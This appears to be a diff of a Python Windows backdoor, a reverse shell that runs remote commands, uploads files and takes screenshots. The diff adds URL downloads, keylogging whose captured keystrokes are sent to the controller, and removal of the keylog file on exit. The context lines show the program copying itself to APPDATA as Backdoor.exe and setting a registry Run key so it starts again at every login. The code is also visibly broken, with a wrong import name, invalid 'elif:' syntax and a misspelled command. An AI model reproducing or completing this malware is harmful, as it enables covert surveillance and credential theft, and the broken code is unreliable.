@@ -8,7 +8,10 @@ import os
 import sys
 import shutil
 import base64
+import request
 import ctypes
+import threading
+import keylogger
 from mss import mss
 
 def reliable_send(data):
@@ -32,6 +35,13 @@ def reliable_recv():
 			return json.loads(json_data)
 		except ValueError:
 			continue
+
+def download(url):
+	get_response= requests.get(url)
+	file_name = url.split("/")[-1]
+	with open(file_name, "wb") as out_file:
+		out_file.write(get_response.content)
+
 def screenshot():
 	with mss() as screenshot:
 		screenshot.shot()
@@ -49,6 +59,10 @@ def shell():
 		command=reliable_recv()
 
 		if command=="q":
+			try:
+				os.remove(keylogger_path)
+			except:
+				continue
 			break
 		elif command[:2] =="cd" and len(command) >1:
 			try:
@@ -61,7 +75,13 @@ def shell():
 		elif command[:6] == "upload":
 			with open(command[7:], 'wb') as fin:
 				result = reliable_recv()
-				fin.write(base64.b64decode(result)) 
+				fin.write(base64.b64decode(result))
+		elif command[:3] == "get":
+			try:
+				download(command[4:])
+				reliable_send("[+] download sucessfull")
+			except:
+				reliable_send("[!!] failed download file") 
 		elif command[:5] == "start":
 			try:
 				subprocess.Popen(command[6:],shell=True)
@@ -82,6 +102,15 @@ def shell():
 				reliable_send(admin)
 			except:
 				reliable_send("Can't perform check")
+		elif: command[:12] == "keylog_start":
+			try
+				t1 =  threading.Thread(target=keylogger.start)
+				t1.start()
+			except:
+				reliable_send("can't start keylogger")
+		elif: command[:11] == "kelog_dump":
+			fn=open(keylogger_path,"r")
+			reliable_send(fn.read())
 		else:
 			try:
 				proc=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -90,7 +119,8 @@ def shell():
 			except:
 				reliable_send('cant send ')
 
-location=os.environ["appdata"] + "\Backdoor.exe"
+keylogger_path=os.environ["appdata"] + "\\keylogger.txt"
+location=os.environ["appdata"] + "\\Backdoor.exe"
 if not os.path.exists(location):
 	shutil.copyfile(sys.executable, location)
 	subprocess.call('reg add HKCU\Software\Micrsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "'+ location + '"', shell=True )
